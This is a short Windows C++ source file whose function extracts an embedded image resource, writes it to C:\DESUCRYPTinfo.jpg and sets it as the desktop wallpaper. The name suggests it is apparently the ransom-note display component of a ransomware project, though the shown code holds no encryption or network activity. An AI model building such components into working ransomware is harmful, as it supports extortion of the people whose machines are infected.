#include "stdafx.h"
void putImage() {
	DWORD junk;
	HMODULE hInstance= GetModuleHandle(NULL);
	HRSRC imageHandle = FindResource(hInstance, MAKEINTRESOURCE(102), _T("IMG"));
	if (imageHandle == NULL) {
		std::cout << "cant find resource" <<  std::endl;
		return;
	}
	HGLOBAL imageDataHandle = LoadResource(hInstance, imageHandle);
	if (imageDataHandle == NULL) {
		std::cout << "cant acquire resource handle" << std::endl;
		return; }
	DWORD sizeRes = SizeofResource(NULL, imageHandle);
	LPVOID memRes = LockResource(imageDataHandle);
	HANDLE backgroundFile = CreateFile(L"C:\\DESUCRYPTinfo.jpg", GENERIC_WRITE, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (backgroundFile == INVALID_HANDLE_VALUE) {
		std::cout << "cant create file" << std::endl;
		return;
	}
	WriteFile(backgroundFile, memRes, sizeRes, &junk, NULL);
	CloseHandle(backgroundFile);
	if (SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, L"C:\\DESUCRYPTinfo.jpg", SPIF_UPDATEINIFILE) != 0)
	{
		std::cout << "wallpaper set" << std::endl;
		LPITEMIDLIST pidl;
		SHGetSpecialFolderLocation(NULL, CSIDL_DESKTOP, &pidl);
		SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, pidl, 0);
	}
}
